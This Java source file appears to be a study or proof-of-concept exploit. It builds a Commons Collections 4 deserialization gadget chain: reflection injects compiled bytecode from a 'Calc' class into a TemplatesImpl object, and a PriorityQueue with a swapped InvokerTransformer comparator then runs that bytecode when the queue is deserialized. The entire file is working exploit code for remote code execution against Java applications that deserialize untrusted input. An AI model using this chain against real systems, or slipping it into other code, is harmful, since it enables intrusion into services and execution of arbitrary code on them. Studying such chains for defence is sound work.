import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.ixpqxi.util.SerTools;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class EnterChain {
    public static void main(String[] args) throws NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException {
        TransformerFactoryImpl factory = new TransformerFactoryImpl();

        TemplatesImpl templates = new TemplatesImpl();

        Field name = TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "Calc");

//        Field tfactory = TemplatesImpl.class.getDeclaredField("_tfactory");
//        tfactory.setAccessible(true);
//        tfactory.set(templates, factory);

        byte[] bytes = Files.readAllBytes(Paths.get("./util/target/classes/org/ixpqxi/util/Calc.class"));
        byte[][] bytecodes = {bytes};

        Field _bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        _bytecodes.setAccessible(true);
        _bytecodes.set(templates, bytecodes);

        InvokerTransformer<Object, Object> invokerTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});

        TransformingComparator<Object, Object> transformingComparator = new TransformingComparator<>(new ConstantTransformer<>(1));
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(templates);

        Field transformer = TransformingComparator.class.getDeclaredField("transformer");
        transformer.setAccessible(true);
        transformer.set(transformingComparator, invokerTransformer);

        SerTools.serialize(priorityQueue);
        SerTools.unserialize("ser.bin");
    }
}
